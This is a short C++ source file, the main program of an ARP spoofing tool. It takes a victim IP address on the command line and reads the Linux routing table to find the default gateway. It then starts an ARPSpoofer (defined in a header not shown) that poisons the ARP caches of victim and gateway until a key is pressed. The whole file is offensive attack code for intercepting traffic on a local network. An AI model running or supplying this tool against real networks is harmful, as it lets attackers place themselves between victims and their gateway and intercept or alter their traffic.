#include<iostream>
#include<cstring>
#include<unistd.h>
#include<arpa/inet.h>
#include"arpspoofer.h"
using namespace std;


int main(int argc, char* argv[])
{
    FILE *f;
    char line[100],*p,*c,*g,*save;
    struct in_addr gatewayip;
    char gateway[20];

    if(argc != 2){
        cout << "[-] Usage " << argv[0] << " <Victim>" << endl;
        return 1;
    }


    f = fopen("/proc/net/route","r");
    while(fgets(line,100,f))
    {
        p = strtok_r(line," \t",&save);
        c = strtok_r(NULL," \t",&save);
        g = strtok_r(NULL," \t",&save);
        if(p!= NULL && c!=NULL)
        {
            if(!strcmp(c, "00000000"))
            {
                if(g)
                {
                    char *end;
                    int ng = strtol(g,&end,16);
                    gatewayip.s_addr=ng;
                }
                break;
            }
        }
    }
    inet_ntop(AF_INET,&gatewayip.s_addr,gateway,sizeof(gateway));
    ARPSpoofer arpc(argv[1],gateway);
    arpc.startarpspoofing();
    cin.get();
    arpc.stoparpspoofing();
    return 0;
}
